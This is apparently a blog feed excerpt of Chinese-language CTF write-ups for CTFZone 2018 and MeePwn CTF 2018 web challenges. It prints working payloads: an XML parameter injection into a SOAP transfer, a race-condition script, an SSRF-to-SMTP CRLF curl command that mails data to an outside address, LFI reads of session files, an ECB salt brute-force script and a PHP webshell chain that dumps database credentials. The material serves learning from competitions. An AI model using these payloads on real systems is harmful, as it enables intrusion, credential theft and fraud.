+&lt;pre&gt;&lt;code&gt;POST /home/transfer.php HTTP/1.1
+Host: web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one
+Content-Length: 21
+Cache-Control: max-age=0
+Origin: http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Referer: http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/home/transfer.php
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=
+Connection: close
+
+receiver=1624&amp;lt;/receiver_wallet_num&amp;gt;&amp;lt;amount&amp;gt;1000000&amp;lt;/amount&amp;gt;&amp;lt;sender_wallet_num&amp;gt;1337&amp;lt;/sender_wallet_num&amp;gt;&amp;lt;receiver_wallet_num&amp;gt;1624&amp;amp;amount=
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此时服务端会接收到如下数据：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-xml&#34;&gt;&amp;lt;soapenv:Envelope xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot; xmlns:xsd=&amp;quot;http://www.w3.org/2001/XMLSchema&amp;quot; xmlns:soapenv=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot; xmlns:urn=&amp;quot;urn:Bank&amp;quot;&amp;gt;
+  &amp;lt;soapenv:Header/&amp;gt;
+  &amp;lt;soapenv:Body&amp;gt;
+    &amp;lt;urn:internalTransfer soapenv:encodingStyle=&amp;quot;http://schemas.xmlsoap.org/soap/encoding/&amp;quot;&amp;gt;
+      &amp;lt;receiver_wallet_num xsi:type=&amp;quot;xsd:decimal&amp;quot;&amp;gt;1624&amp;lt;/receiver_wallet_num&amp;gt;
+      &amp;lt;amount&amp;gt;1000000&amp;lt;/amount&amp;gt;
+      &amp;lt;sender_wallet_num&amp;gt;1337&amp;lt;/sender_wallet_num&amp;gt;
+      &amp;lt;receiver_wallet_num&amp;gt;1624&amp;lt;/receiver_wallet_num&amp;gt;
+      &amp;lt;sender_wallet_num xsi:type=&amp;quot;xsd:decimal&amp;quot;&amp;gt;2746.00&amp;lt;/sender_wallet_num&amp;gt;
+      &amp;lt;amount xsi:type=&amp;quot;xsd:float&amp;quot;&amp;gt;1.25&amp;lt;/amount&amp;gt;
+      &amp;lt;token xsi:type=&amp;quot;xsd:string&amp;quot;&amp;gt;xxxx&amp;lt;/token&amp;gt;
+    &amp;lt;/urn:internalTransfer&amp;gt;
+  &amp;lt;/soapenv:Body&amp;gt;
+&amp;lt;/soapenv:Envelope&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;由于服务器只解析第一项作为相应参数，所以此时我们注入的 xml 条目将被解析，导致我们成功 hack 了转账流程，给自己增加了账户余额&lt;/p&gt;
+
+&lt;h2 id=&#34;mmorpg-3000&#34;&gt;MMORPG 3000&lt;/h2&gt;
+
+&lt;p&gt;一个神奇的 RPG 游戏，你可以通过对战升级或者充钱两种方式变强&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CTFZone-2018/info.png&#34; alt=&#34;Info&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;对战是不可能对战的，一辈子也不可能对战的，也就靠充钱这种方式才能变强了&lt;/p&gt;
+
+&lt;p&gt;但问题是每个新注册的玩家只能获得 1 元的优惠券，这是完全不够的，怎么办呢？&lt;/p&gt;
+
+&lt;p&gt;我们关注到优惠券的 url：&lt;code&gt;http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_69a5b5995110b36a9a347898d97a610e.png&lt;/code&gt; 中 &lt;code&gt;69a5b5995110b36a9a347898d97a610e&lt;/code&gt; 类似某种数据的 md5 值，使用 cmd5 查询后可得 1129，而此时用户的 id 是 129，由此可以推测对应的优惠券生成规则是 &lt;code&gt;md5(&#39;1&#39;+id)&lt;/code&gt;，所以我们尝试访问 id 为 1 用户对应的优惠券：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CTFZone-2018/coupon.png&#34; alt=&#34;coupon&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;现在我们有着充足的金额，足够我们买到 100 级了，但在这里存在着一个极为尴尬的情况：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CTFZone-2018/levelup.png&#34; alt=&#34;leveup&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;我们不能愉快的买买买了！！！&lt;/p&gt;
+
+&lt;p&gt;升级又不可能升级的，所以我们只能尝试是否能够突破现在的等级限制，其中的一个思路即条件竞争，当我们同时发出升级的请求时，系统的处理不当，所以可能存在着这样一种特殊的场景：此时我们是 29 级，服务端先后接到了两个升级的请求，由于这两个请求到达时用户尚在 29 级，所以升级条件成立，此时用户成功升级到 31 级。基于这种思路，我们可以编写多线程的条件竞争脚本：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
+import threading
+
+url = &amp;quot;http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/donate/lvlup&amp;quot;
+
+session = &amp;quot;eyJ1aWQiOjEyOX0.DjjTig.8gYI8wcramg-dCXFSIlKjF_P61g&amp;quot;
+
+max = 100
+
+def levlup(session):
+    requests.get(url, cookies={&amp;quot;session&amp;quot;: session})
+
+def race():
+    for i in range(max):
+        t = threading.Thread(target=levlup, args=(session,))
+        t.start()
+
+def main():
+    race()
+
+if __name__ == &#39;__main__&#39;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此时我们成功升级到 35 级：
+&lt;img src=&#34;https://syang-ng.github.io/images/posts/CTFZone-2018/level35.png&#34; alt=&#34;level 35&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;此时我们发现我们多了一个上传头像的功能：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CTFZone-2018/avatar.png&#34; alt=&#34;avatar&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;此时推测这里存在着一个 SSRF 的漏洞（非常合理，笑&lt;/p&gt;
+
+&lt;p&gt;但直接访问 127.0.0.1 或是 localhost 是会被拒绝的，但我们可以访问 0.0.0.0 呀，这里就可以开始扫描一波端口了&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CTFZone-2018/port.png&#34; alt=&#34;port&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;扫完发现端口 25 是打开的状态，该端口对应的是 SMTP 协议，这里可以尝试 HTTP Header Inject&lt;/p&gt;
+
+&lt;p&gt;简单说即让通过构造命令的方式让服务器向我们发送相应邮件，这里直接附上相应的 payload：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-shell&#34;&gt;curl &#39;web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar&#39; -H &#39;Cookie: session=eyJ1aWQiOjEyOX0.DjmXSw.pNA7u3H_ZtcQpSHIdN4nWCUfi3o&#39; --data &#39;url=https://0.0.0.0%0d%0aMAIL FROM: &amp;lt;A@B.C&amp;gt;%0aRCPT TO: &amp;lt;youremail@server.com&amp;gt;%0aDATA%0aFROM: AAA@B.C%0aTO: youremail@server.com%0aSUBJECT: FLAG%0d%0a.%0d%0a%0aQUIT%0a:25&amp;amp;action=save&#39;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CTFZone-2018/email.png&#34; alt=&#34;email&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;上述思路就不知道大佬是怎么思考出来的了，真好奇.jpg&lt;/p&gt;
+
+&lt;h2 id=&#34;validator3000&#34;&gt;Validator3000&lt;/h2&gt;
+
+&lt;p&gt;一道 window 相关的逆向题，解题流程如下：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;运行 &lt;code&gt;Validator3000.exe&lt;/code&gt; 程序&lt;/li&gt;
+&lt;li&gt;点击 &lt;code&gt;Check Flag&lt;/code&gt; button&lt;/li&gt;
+&lt;li&gt;打开任务管理器，选择该程序，右键 =&amp;gt; 创建转储文件&lt;/li&gt;
+&lt;li&gt;用二进制编辑器打开创建好的转储文件，一般而言该文件位于 &lt;code&gt;C:\Users\xxx\AppData\Local\Temp\Validator3000.DMP&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;在二进制编辑器中，搜索 &lt;code&gt;ctfzone{&lt;/code&gt; 字段，记得使用 Unicode 编码&lt;/li&gt;
+&lt;li&gt;即可搜得 flag: &lt;code&gt;ctfzone{R3Flec7i0n}&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;挺有意思的一道题目（笑&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/CTFZone-2018/Validator3000.png&#34; alt=&#34;Dump Memory&#34; /&gt;
+&lt;img src=&#34;https://syang-ng.github.io/images/posts/CTFZone-2018/unicode.png&#34; alt=&#34;Unicode&#34; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/p4-team/ctf/tree/master/2018-07-21-ctfzone-quals&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;p4 - 2018-07-21-ctfzone-quals&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&#34;https://ctftime.org/event/632/tasks/&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;writeup on ctftime&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>MeePwn CTF 2018 Web Part2</title>
+      <link>https://syang-ng.github.io/2018/07/meepwnctf-2018-web-part2/</link>
+      <pubDate>Fri, 20 Jul 2018 15:00:22 +0000</pubDate>
+      
+      <guid>https://syang-ng.github.io/2018/07/meepwnctf-2018-web-part2/</guid>
+      <description>
+
+&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;MeePwn CTF 2018 剩下的 Web 题，主要是基于 PHP 的代码审计，考点颇多，恰好是我所不擅长的区域😭&lt;/p&gt;
+
+&lt;p&gt;赶紧来复现一下提高姿势水平&lt;/p&gt;
+
+&lt;h2 id=&#34;mapl-story&#34;&gt;Mapl Story&lt;/h2&gt;
+
+&lt;p&gt;主要考点有 PHP 代码审计能力，以及对 PHP session 的理解，PHP webshell 的利用，和对 AES-128-ECB 的攻击&lt;/p&gt;
+
+&lt;h3 id=&#34;lfi&#34;&gt;LFI&lt;/h3&gt;
+
+&lt;p&gt;访问以下 URL，可以发现这里存在着一个文件包含问题&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;http://178.128.87.16/?page=/etc/group
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;root❌0: daemon❌1: bin❌2: sys❌3: adm❌4:syslog tty❌5: disk❌6: lp❌7: mail❌8: news❌9: uucp❌10: man❌12: proxy❌13: kmem❌15: dialout❌20: fax❌21: voice❌22: cdrom❌24: floppy❌25: tape❌26: sudo❌27: audio❌29: dip❌30: www-data❌33: backup❌34: operator❌37: list❌38: irc❌39: src❌40: gnats❌41: shadow❌42: utmp❌43: video❌44: sasl❌45: plugdev❌46: staff❌50: games❌60: users❌100: nogroup❌65534: systemd-journal❌101: systemd-timesync❌102: systemd-network❌103: systemd-resolve❌104: systemd-bus-proxy❌105: input❌106: crontab❌107: syslog❌108: netdev❌109: lxd❌110: messagebus❌111: uuidd❌112: ssh❌113: mlocate❌114: admin❌115: docker❌116: ssl-cert❌117: mysql❌118:
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;但可以看到由于在 &lt;code&gt;index.php&lt;/code&gt; 中存在着相应的过滤：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function bad_words($value)
+{
+	//My A.I TsuGo show me that when player using these words below they feel angry, so i decide to censor them.
+	//Maybe some word is false positive but pls accept it, for a no-cancer gaming environment!
+	$too_bad=&amp;quot;/(fuck|bakayaro|ditme|bitch|caonima|idiot|bobo|tanga|pin|gago|tangina|\/\/|damn|noob|pro|nishigou|stupid|ass|\(.+\)|`.+`|vcl|cyka|dcm)/is&amp;quot;;
+	$value = preg_replace($too_bad, str_repeat(&amp;quot;*&amp;quot;,3) ,$value);
+	return $value;
+}
+
+foreach($_GET as $key=&amp;gt;$value)
+{
+    if (is_array($value))
+    {
+    	mapl_die();
+    }
+	$value=bad_words($value);
+	$_GET[$key]=$value;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;暂时看来操作幅度不大，不过这里存在的意义在于我们可以泄露出相应 session 的信息&lt;/p&gt;
+
+&lt;p&gt;已知我们 PHPSESSID 的值为 &lt;code&gt;o2c7bnl64jf2va8edho3ectvb6&lt;/code&gt;，那么我们可以尝试通过以下网址访问我们的：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;http://178.128.87.16/index.php?page=/var/lib/php/sessions/sess_o2c7bnl64jf2va8edho3ectvb6
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;pre&gt;&lt;code&gt;character_name|s:64:&amp;quot;ecbce3a67b2cc65c58209871a7e43ea5f784018f9d30944e3a1aa542e3c48140&amp;quot;;user|s:64:&amp;quot;2e1e63cfe3e8ac1b0292d31d97824c92aff14592cde39c9bf27d7c5ef2a1c872&amp;quot;;action|s:28:&amp;quot;[03:53:29pm GMT+7] Logged In&amp;quot;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3 id=&#34;admin&#34;&gt;Admin&lt;/h3&gt;
+
+&lt;p&gt;尝试访问 &lt;code&gt;admin.php&lt;/code&gt;，发现程序提示我们没有相应的 admin 权限，这意味着我们的第一步很可能是先变为 admin&lt;/p&gt;
+
+&lt;p&gt;审计代码，可以看到服务器对 admin 的校验是以 Cookie 中的 &lt;code&gt;_role&lt;/code&gt; 为依据的&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;function is_admin($salt){
+    if(isset($_COOKIE[&#39;_role&#39;]) &amp;amp;&amp;amp; !empty($_COOKIE[&#39;_role&#39;]) &amp;amp;&amp;amp; $_COOKIE[&#39;_role&#39;]===hash(&#39;sha256&#39;, &#39;admin&#39;.$salt)) {
+        return 1;
+    }
+        return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;只有当 &lt;code&gt;sha256(&#39;admin&#39;.$salt)&lt;/code&gt; 的值与 Cookie 中 &lt;code&gt;_role&lt;/code&gt; 值相等时，服务器会主动将用户识别为 admin&lt;/p&gt;
+
+&lt;p&gt;继续审计代码，我们得到的结论是，我们无法通过手动修改 Cookie 外的方式成为 admin，因为服务端会默认将所有人设置成 user：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;// login
+if ($row[&#39;userIsAdmin&#39;]===&#39;1&#39;){
+    $data=&#39;admin&#39;.$salt;
+    $role=hash(&#39;sha256&#39;, $data);
+    setcookie(&#39;_role&#39;,$role);
+} else {
+    $data=&#39;user&#39;.$salt;
+    $role=hash(&#39;sha256&#39;, $data);
+    setcookie(&#39;_role&#39;,$role);					
+}
+// register
+$query = &amp;quot;INSERT INTO users(`userName`, `userEmail`, `userPass`, `userIsAdmin`, `userDesc`, `userAvatar`) VALUES(&#39;$name&#39;,&#39;$email&#39;,&#39;$password&#39;,0,&#39; &#39;,&#39;default.png&#39;)&amp;quot;;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;那么我们唯一的思路即通过计算出 &lt;code&gt;$salt&lt;/code&gt; 的方式来计算出我们希望的 sha256 值，脚本如下：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
+import string
+
+s = requests.Session()
+
+def login():
+    payload = {&amp;quot;email&amp;quot;: &amp;quot;qwe@eee.com&amp;quot;, &amp;quot;pass&amp;quot;: &amp;quot;qweqwe&amp;quot;, &amp;quot;btn-login&amp;quot;: 1}
+    return s.post(&#39;http://178.128.87.16/index.php?page=login.php&#39;, data=payload)
+
+def change_name(name):
+    payload = {&amp;quot;name&amp;quot;:name}
+    return s.post(&#39;http://178.128.87.16/index.php?page=setting.php&#39;, data=payload)
+
+def get_sha256(text):
+    return text[21:85]
+
+
+def main():
+    sess = &#39;http://178.128.87.16/index.php?page=/var/lib/php/sessions/sess_&#39;
+    base = &#39;A&#39;*16
+    salt = &#39;&#39;
+    guess_range = string.printable
+
+    assert(&#39;Game&#39; in login().text)
+    
+    sess += s.cookies[&#39;PHPSESSID&#39;]
+
+    print(sess)
+
+    while len(salt) &amp;lt; 16:
+        base = base[👎]
+        if base == &#39;&#39;:
+            name = &#39;A&#39;*16
+        else:
+            name = base
+        change_name(name)
+        s1 = get_sha256(s.get(sess).text)
+        s1 = s1[:32] if len(name) != 16 else s1[32:64]
+        for i in guess_range:
+            name = base + salt + i
+            change_name(name)
+            s2 = get_sha256(s.get(sess).text)[:32]
+            if s1 == s2:
+                salt += i
+                print(salt)
+                break
+    print(salt)
+
+if __name__ == &#39;__main__&#39;:
+    main()
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;核心思路还是 ECB 模式的缺陷，即 ECB 的每一块都是使用完全相同的方式进行界面加解密，所以明文和密文的每一块都是一一对应的，这也给了我们暴力猜解 &lt;code&gt;$salt&lt;/code&gt; 的可能性，我们只需要通过枚举的方式，将 &lt;code&gt;$salt&lt;/code&gt; 枚举出即可: &lt;code&gt;ms_g00d_0ld_g4m3&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;计算 &lt;code&gt;sha256(&#39;admin&#39;.&#39;ms_g00d_0ld_g4m3&#39;)&lt;/code&gt; 即能以 admin 的状态登录了~~&lt;/p&gt;
+
+&lt;h3 id=&#34;webshell&#34;&gt;webshell&lt;/h3&gt;
+
+&lt;p&gt;在 admin 状态下，我们多了一个赠送宠物的功能：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/MeePwn-CTF-2018-Web/mapl_story_admin.png&#34; alt=&#34;Admin&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;我们可以尝试给自己赠送一个宠物，然后在 &lt;code&gt;character.php&lt;/code&gt; 来训练一个宠物：&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&#34;https://syang-ng.github.io/images/posts/MeePwn-CTF-2018-Web/mapl_story_character.png&#34; alt=&#34;Character&#34; /&gt;&lt;/p&gt;
+
+&lt;p&gt;继续审计 PHP 代码，我们可以知道相应的命令会被存入 &lt;code&gt;/upload/md5($salt.$email)/command.txt&lt;/code&gt; 中：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;if(isset($_POST[&#39;command&#39;]) &amp;amp;&amp;amp; !empty($_POST[&#39;command&#39;])){
+    if(strlen($_POST[&#39;command&#39;])&amp;gt;=20) {
+        echo &#39;&amp;lt;center&amp;gt;&amp;lt;strong&amp;gt;Too Long&amp;lt;/strong&amp;gt;&amp;lt;/center&amp;gt;&#39;;
+    }
+    else {
+        save_command($mail,$salt,$_POST[&#39;command&#39;]);
+        header(&amp;quot;Refresh:0&amp;quot;);
+    }
+}
+
+function save_command($email,$salt,$data){
+    $dir=&#39;./upload/&#39;.md5($salt.$email);
+    file_put_contents($dir.&#39;/command.txt&#39;, $data);
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;那么我们可不可以直接在这里写入 webshell 呢？再利用 LFI 加载该文件以达成 webshell 效果，但事实是这条尝试是失败的😭&lt;/p&gt;
+
+&lt;p&gt;那么剩下的思路是再从新的地方尝试导入我们编写的 webshell&lt;/p&gt;
+
+&lt;p&gt;这里的思路就比较 trick 了（向大佬低头&lt;/p&gt;
+
+&lt;p&gt;我们可以看到 session 的 log 中存在一个记录用户操作的 &lt;code&gt;action&lt;/code&gt;，所以我们可以尝试向 &lt;code&gt;&amp;lt;?=include&amp;quot;$_COOKIE[0]&lt;/code&gt; 用户赠送宠物，这样当我们修改 cookie 时，相应的文件即可被加载进来&lt;/p&gt;
+
+&lt;p&gt;此时我们需要进行如下三个操作：&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;修改 command.txt 内容，使其值为&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;PD89YCRFR0VUWZFDYDS`(&amp;lt;?=`$_GET[1]`)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;ol&gt;
+&lt;li&gt;注册用户名为 &lt;code&gt;&amp;lt;?=include&amp;quot;$_COOKIE[0]&lt;/code&gt;，并向其赠送宠物&lt;/li&gt;
+&lt;li&gt;修改 cookie 加入 &lt;code&gt;{0: php://filter/convert.base64-decode/resource=/upload/64aed470d7164b1fdf381db0cd82ebd7/command.txt}&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;访问 &lt;code&gt;http://178.128.87.16/index.php?page=/var/lib/php/sessions/sess_o2c7bnl64jf2va8edho3ectvb6?1=ls&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;此时我们已经拿到了一个最基本的 webshell，构造 payload，我们即能得到 &lt;code&gt;dbconnect.php&lt;/code&gt; 相对应的源代码：&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-http&#34;&gt;http://178.128.87.16/index.php?page=/var/lib/php/sessions/sess_o2c7bnl64jf2va8edho3ectvb6&amp;amp;1=cat%20dbconnect.php
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt; &amp;lt;?php
+	define(&#39;DBHOST&#39;, &#39;localhost&#39;);
+	define(&#39;DBUSER&#39;, &#39;mapl_story_user&#39;);
+	define(&#39;DBPASS&#39;, &#39;tsu_tsu_tsu_tsu&#39;); 
+	define(&#39;DBNAME&#39;, &#39;mapl_story&#39;);
+	
+	$conn = mysqli_connect(DBHOST,DBUSER,DBPASS,DBNAME);
+		
+	if ( !$conn ) {
+		die(&amp;quot;Connection failed : &amp;quot; . mysql_error());
+    }
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;此时我们已经拿到了数据库的账号密码，以及相应的数据库名，那么只要在数据库中运行 &lt;code&gt;SELECT * FROM mapl_config&lt;/code&gt;，即能获得相应的 flag&lt;/p&gt;
+
+&lt;p&gt;我们需要实现以下两步：
+1. 连接数据库：mysql -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story
+2. 查询 flag：SELECT * FROM mapl_config;&lt;/p&gt;
+
+&lt;p&gt;那么写成 payload 即可以如下形式：&lt;code&gt;echo &#39;SELECT * FROM mapl_config;&#39;| mysql -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;运行 payload，即可获得 flag：MeePwnCTF{&lt;strong&gt;Abus1ng_SessioN_Is_AlwAys_C00L_1337!&lt;/strong&gt;_}&lt;/p&gt;
+
+&lt;h2 id=&#34;参考链接&#34;&gt;参考链接&lt;/h2&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://ctftime.org/writeup/10418&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;Mapl Story by RedRocket&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>MeePwn CTF 2018 Web</title>
+      <link>https://syang-ng.github.io/2018/07/meepwnctf-2018-web/</link>
+      <pubDate>Tue, 17 Jul 2018 18:04:35 +0000</pubDate>
+      
+      <guid>https://syang-ng.github.io/2018/07/meepwnctf-2018-web/</guid>
+      <description>
+
+&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;上周末打了 MeePwnCTF 2018，感觉还是非常有价值的一场比赛&lt;/p&gt;
+
+&lt;h2 id=&#34;grandline&#34;&gt;Grandline&lt;/h2&gt;
+
+&lt;p&gt;本题的考点是 RPO 攻击问题，关于 RPO 攻击的具体细节，可以自行 Google，这里不再做过多叙述&lt;/p&gt;
+
+&lt;p&gt;访问 &lt;a href=&#34;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/?debug，可以获得页面源码：&#34; rel=&#34;nofollow noreferrer&#34; target=&#34;_blank&#34;&gt;http://178.128.6.184/3915ef41890b96cc883ba6ef06b944805c9650ee/index.php/?debug，可以获得页面源码：&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;!-- 
+/* * *  Power By 0xd0ff9 * * * 
+--&amp;gt; 
+&amp;lt;?php 
+include &amp;quot;config.php&amp;quot;; 
+if(isset($_GET[&#39;debug&#39;])) 
+{ 
+    show_source(__FILE__); 
+    die(&amp;quot;...&amp;quot;); 
+} 
+?&amp;gt; 
+&amp;lt;!DOCTYPE html&amp;gt; 
+&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; 
+&amp;lt;head&amp;gt; 
+  &amp;lt;title&amp;gt;The Two piece Treasure&amp;lt;/title&amp;gt; 
+  &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt; 
+  &amp;lt;meta name=&amp;quot;viewport&amp;quot; content=&amp;quot;width=device-width, initial-scale=1&amp;quot;&amp;gt; 
+  &amp;lt;!-- Latest compiled and minified CSS --&amp;gt; 
+  &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;css/bootstrap.min.css&amp;quot;&amp;gt; 
+  &amp;lt;!-- jQuery library --&amp;gt; 
+  &amp;lt;script src=&amp;quot;js/jquery.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt; 
+  &amp;lt;!-- Latest compiled JavaScript --&amp;gt; 
+  &amp;lt;script src=&amp;quot;js/bootstrap.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt; 
+&amp;lt;/head&amp;gt; 
+&amp;lt;body&amp;gt; 
+&amp;lt;?php 
+$grandline = $_SERVER[&#39;REQUEST_URI&#39;]; 
+// Best Grandline is short 
+$grandline = substr($grandline,0,500); 
+echo &amp;quot;&amp;lt;!-- P/s: Your grand line is &amp;quot;.htmlentities(urldecode($grandline),ENT_QUOTES).&amp;quot; , this is not Luffy &#39;s grand line --&amp;gt;&amp;quot;; 
+?&amp;gt; 
+&amp;lt;div class=&amp;quot;container&amp;quot;&amp;gt; 
+&amp;lt;div class=&amp;quot;jumbotron&amp;quot;&amp;gt; 
+    &amp;lt;h1&amp;gt;GRAND LINE&amp;lt;/h1&amp;gt;  
+    &amp;lt;p&amp;gt;Welcome to Grand Line, You are in the way to become Pirate King, now, let&#39;s defeat &amp;lt;a href=&amp;quot;bot.php&amp;quot;&amp;gt;BigMom&amp;lt;/a&amp;gt; first&amp;lt;/p&amp;gt;  
+&amp;lt;/div&amp;gt; 
+&amp;lt;?php 
+$loca = $_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;]; 
+echo &amp;quot;&amp;lt;input name=&#39;location&#39; value=&#39;&amp;quot;.$loca.&amp;quot;&#39; type=&#39;hidden&#39;&amp;gt;&amp;lt;br&amp;gt;&amp;quot;; 
+if ($loca === &amp;quot;127.0.0.1&amp;quot; || $loca===&amp;quot;::1&amp;quot;) 
+{ 
+    echo &amp;quot;&amp;lt;input name=&#39;piece&#39; value=&#39;&amp;quot;.$secret.&amp;quot;&#39; type=&#39;hidden&#39;&amp;gt;&amp;quot;; 
+} 
+else 
+{ 
+    echo &amp;quot;&amp;lt;input name=&#39;piece&#39; value=&#39;Only whitebeard can see it, Gura gura gura&#39; type=&#39;hidden&#39;&amp;gt;&amp;quot;; 
+} 
+?&amp;gt; 
+  &amp;lt;h4&amp;gt;If you eat fruit, you can&#39;t swim&amp;lt;/h4&amp;gt; 
+        &amp;lt;img src=&amp;quot;images/grandline.png&amp;quot;/&amp;gt; 
+        &amp;lt;br&amp;gt; 
+        &amp;lt;form method=&amp;quot;get&amp;quot; action=&amp;quot;index.php&amp;quot;&amp;gt; 
+        &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;eat&amp;quot; placeholder=&amp;quot;&amp;quot; value=&amp;quot;gomu gomu no mi&amp;quot;&amp;gt;         
+        &amp;lt;input type=&amp;quot;submit&amp;quot;&amp;gt; 
+        &amp;lt;/form&amp;gt; 
+    &amp;lt;?php  
+    if(isset($_GET[&#39;eat&#39;])&amp;amp;&amp;amp;!empty($_GET[&#39;eat&#39;])) 
+    { 
+        if($_GET[&#39;eat&#39;] === &amp;quot;gomu gomu no mi&amp;quot;) 
+        { 
+            echo &amp;quot;&amp;lt;p&amp;gt;Pirate, Let&#39;s go to your Grand Line&amp;lt;/p&amp;gt;&amp;quot;; 
+        } 
+        else 
+        { 
+            echo &amp;quot;&amp;lt;p&amp;gt;You need to eat &#39;gomu gomu no mi&#39;&amp;lt;/p&amp;gt;&amp;quot;; 
+        } 
+    } 
+     
+    ?&amp;gt; 
+&amp;lt;/div&amp;gt; 
